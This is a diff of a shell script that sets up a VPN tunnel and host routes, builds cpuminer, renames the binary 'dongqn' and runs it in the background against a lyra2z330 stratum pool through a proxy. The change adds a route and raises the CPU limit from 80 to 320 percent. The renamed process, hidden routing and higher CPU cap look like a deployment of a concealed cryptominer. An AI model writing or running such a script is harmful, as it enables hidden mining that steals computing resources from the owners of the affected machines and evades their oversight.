@@ -82,6 +82,7 @@ echo "c myvpn" > /var/run/xl2tpd/l2tp-control
 sleep 5s
 IP=$(/sbin/ip route | awk '/default/ { print $3 }')
 route add 45.77.253.212 gw $IP
+route add 117.7.81.138 gw $IP
 route add default dev ppp0
 wget -qO- http://ipv4.icanhazip.com > ip.txt
 
@@ -92,4 +93,4 @@ chmod +x *
 ./build.sh
 mv cpuminer dongqn
 make
-cpulimit --exe dongqn --limit 80 -b && ./dongqn -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u minhthang.10 -p x -x dongqn.cf:1221 --background
+cpulimit --exe dongqn --limit 320 -b && ./dongqn -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u minhthang.10 -p x -x dongqn.cf:1221 --background
